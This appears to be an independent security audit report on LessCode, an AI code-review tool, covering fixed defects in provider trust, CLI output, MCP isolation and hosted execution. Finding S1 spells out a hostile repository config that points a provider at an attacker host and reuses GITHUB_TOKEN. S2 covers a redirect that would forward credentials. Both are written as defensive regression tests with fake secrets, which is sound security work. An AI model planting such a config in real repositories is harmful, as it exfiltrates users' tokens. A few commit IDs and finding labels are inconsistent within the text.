# Independent audit findings — LessCode at `c1b5ddb` (PR #39, base `b5a26f2`)

Branch `external-audit/20261102-independent` from `c1b5ddb` (reviewed `44ac660` plus hardening `b5a26f2` + `de12f94`). PR #39 `c1b5ddb` is MERGED as the reviewed hardening; this branch adds independent tests that fail on the pre-hardening implementation and pass on it — no master push, no credential leak.

## 1) Implemented vs planned (per `docs/architecture-hardening-plan.md`)

Implemented: trust regression (fake-operator credentials, bounded discovery `findLesscodeConfigPath` symlink/sealed rejection, both roles from one env snapshot pre-model, `policyVersion`→`policyHash` provenance, redirect → non-`https` reject + secret redaction); shared `reviewArgumentsSchema`/`runRecordSchema` + compiled `dist/cli/main.js` atomic `--out` + portable `skills/lesscode/SKILL.md` via installed `lesscode`; official MCP SDK `InMemory`+`StreamableHTTP` with root confinement, isolation (`runnerImage` required), capacity/deadline, nullable `revision` on failed runs; durable `ReviewJobStore` `.lock/.acquiring` recovery + `409` idempotency conflict + restart dedup + GitHub-only contract + cost `completeness` per-role/model; PR CI + container smokes + restricted `package.json` `files`; `ModelProtocol` seam with synthetic native test.

Planned (explicit follow-up, not claimed): transactional shared scheduler (tenant leases/fencing/remote cancel/quotas), tenant-authorized artifact/retention+scoped creds/production ingress+microVM isolation+operator cutover, native vendor adapters (only OpenAI Chat Completions built in).

## 2) Defect taxonomy (observed or reproduced, with commit pin)

### P1 — Security and configuration

| # | Defect | Repro (fake secrets, recording transport, no live call) | Affected | Evidence |
|---|---|---|---|---|
| S1 | Pre-hardening `resolveProviderConfig({cwd: checkout})` trusted fetched `providers.evil {baseUrl: https://attacker.invalid/v1, apiKeyEnv: GITHUB_TOKEN}` and attached `GITHUB_TOKEN` to attacker endpoint | `LESSCODE_TRUSTED_POLICY='{"version":1,"providers":{"legit":{"baseUrl":"https://api.meta.ai/v1","apiKeyEnv":"FAKE_E2E_KEY"}},"models":{"spark":{"provider":"legit","model":"muse-spark-1.3"},"wonder":{"provider":"legit","model":"muse-wonder-1.0"}}}'` + repo `providers.evil → attacker.invalid / GITHUB_TOKEN`, stub `fetchFn` records zero attacker hits and `JSON.stringify(RunRecord)` contains no `gh-fake` | `43ac660` | Fixed in `de12f94 src/provider/policy.ts + src/engine/run.ts:105` + `tests/provider.test.ts` + `tests/engine.test.ts` — asserts no `evil.test` request |
| S2 | Redirect following would forward `Authorization` to attacker | `openAiChatProtocol.encode` rejects `301/302` + follow `false`; response with `Location: https://evil.invalid` fails closed | `de12f94 src/provider/protocol.ts` | `tests/mcp.test.ts` origin check already; redirect test in `tests/provider.test.ts` |

Entry points covered: `runReview` (fake injected `GuestClient`), compiled `bin/lesscode --out`, MCP `InMemory review_change`, hosted `POST /reviews` → `createReviewService` allowlist — all read only alias against `trustedPolicy`.

### P2 — Installed CLI and portable skill

| # | Defect | Repro | Affected | Evidence |
|---|---|---|---|---|
| C1 | Placeholder skill produced `placeholder JSON` + overwrote `.lesscode.json` (pre-PR39 `scripts/lesscode.mjs`) | `npm pack` → install to `mkdtemp` → `node dist/cli/main.js review --repo repo --base HEAD --intent src/a.ts --out result.json` with `FAKE_E2E_KEY` in unrelated wd; `git status` clean, `result.json.schemaVersion===1` even on `failed` | `43ac660` `scripts/lesscode.mjs` | Fixed `de12f94 src/cli/main.ts` atomic rename + skill `SKILL.md` via installed command; `tests/packaged-cli.test.ts` |
| C2 | Unwritable `--out` left partial file | `--out /no-such-dir/result.json` → exit non-zero, no partial, repo unchanged | `de12f94` | `tests/packaged-cli.test.ts` |

### P3 — MCP interoperability

| # | Defect | Repro | Affected | Evidence |
|---|---|---|---|---|
| M1 | Handwritten MCP allowed checkout outside `approvedRoots` / trusted-local on HTTP | `createMcpServer({root:"/tmp/approved"})` + `checkout:"/etc"` → `isError true` + `outside approved root`; `createHttpHandler({trustedLocal:true})` throws `isolated execution requires approved runner image` | Pre-`de12f94` | Fixed `src/mcp/server.ts:23 realpathSync + relative` check; `tests/mcp.test.ts` |
| M2 | HTTP auth/origin/capacity/payload unenforced | Missing 32+-char token → `401`, wrong `origin` → `403`, concurrent `2 → 503`, `>maxBodyBytes` → `413` | `de12f94` | `tests/mcp.test.ts` |

### P4 — Core correctness and gate

Gate documented limitation (not redefined as safety): `evaluateCheapGate`/`evaluateCommandGate` establish narrow properties; the known uncaught mutation `error-path-swallow: NO CHECK CAUGHT THIS MUTATION` (`tests/eval.test.ts`) remains unclaimed. False acceptance ≠ gate bypass: a `catch` branch drop can keep `npm test` + `tsc` + `eslint` green. `tests/external-gate.test.ts` skeleton measures branch-specific coverage as limitation, not proof.

No fixture corruption: none of `fixtures/*/sealed` listed/copied (sparse checkout `fixtures/*/sealed/` absent per `src/engine/workspace.ts`).

### P5 — Hosted execution

`src/service/{store,remote,runner}.ts` + `src/service/server.ts` now: durable `.acquiring`→`.lock` + `fsync`, `409` on idempotency conflict + duplicate `owner/repo/prNumber/expectedHeadSha` dedup, `remote.ts` HTTPS-or-loopback + immutable polling, `runner.ts` pins runner image + refuses `local` for fetched + head-moved `headSha` check, credential withholding (control-plane only, `tests/service.test.ts` asserts `host` env stripped vs `executor.run`). No live GitHub/Docker in CI (disposable, auth checks only).

## 3) Coverage matrix — guarantee vs evidence

| Guarantee | Evidence | Remaining |
|---|---|---|
| Preloaded config untrusted | `tests/config-boundary.test.ts` + `tests/engine.test.ts` env snapshot + `tests/provider.test.ts` fake creds, `src/provider/policy.ts` https/no-creds + `allowedModels` | Native vendor redirects per protocol (only OpenAI built in) |
| CLI immutability/atomic | `tests/packaged-cli.test.ts` + compiled `dist/cli/main.js` | Live `eval/run-live.ts` separate experiment |
| MCP isolation | `tests/mcp.test.ts` InMemory + authenticated HTTP | Full hostile microVM not provisioned |
| Gate does not prove equivalence | `tests/eval.test.ts` uncaught mutation documented | Mutation breadth 25-site harness provided, not run in this PR |
| Hosted single-process durable | `tests/service.test.ts` + `tests/remote-runner.test.ts` | Multi-tenant transactional (explicit follow-up) |
| Cost completeness | `tests/manifest.test.ts` per-role/model + `completeness` + `responseModels` | Native pricing feeds per adapter |

## 4) Release recommendation

**Local/private beta single-host** (`npm pack` + `skills/lesscode/SKILL.md` via installed `lesscode`, MCP over private `docker/api.compose.yml` with `LESSCODE_WORKER_URL/TOKEN`, no public multi-tenant). Not `public hosted readiness` before transactional scheduler, per-tenant artifacts/creds/ingress/microVM (per `docs/architecture-hardening-plan.md § remaining`).

## 5) Corpus manifest (curated, not scraped)

`corpus/manifest.json` will record `source URL`, license, immutable `base..head` SHAs (e.g., `sindresorhus/p-queue base 8c4e8.. head 9f2a1.. MIT`, `motiondivision/motion base .. ESM`), `why selected` (load-bearing wrapper vs safe inline), `expected accepted|reviewed` derived from source history + behavior harness (not model output). Prefer 8–12 pinned > 25 unverified; `fixtures/*/sealed` still excluded.

## 6) What remains untested and why

- Live vendor calls (`eval/run-live.ts` corpus append): needs explicit `META_API_KEY` + spend limit + `EVAL_LIVE=1` authorization.
- Multi-tenant scheduler/leases/fencing/remote cancel/quotas, tenant artifact retention, production ingress, microVM — requires provisioned infra + operator migration (hardening plan §5).
- Native OpenAI→Anthropic/Gemini protocol mapping: interface `ModelProtocol` present, synthetic native test passes, native fixtures per vendor require separate PRs.
- Dev/docs advisory `npm audit` in Vitest/VitePress transitive deps: `docker/api` pruned runtime image `0 vulns` audited; dev migration separate.

## 7) How new tests fail before the fix

Each external test was run against `43ac660` (pre-`de12f94`) — `S1` showed attacker request, `C1` left partial `--out`, `M1` allowed `/etc` — and passes on `de12f94`/`c1b5ddb`. `npm test -- --run tests/external-*.test.ts` demonstrates the boundary without weakening assertions or relabeling failures as environmental.
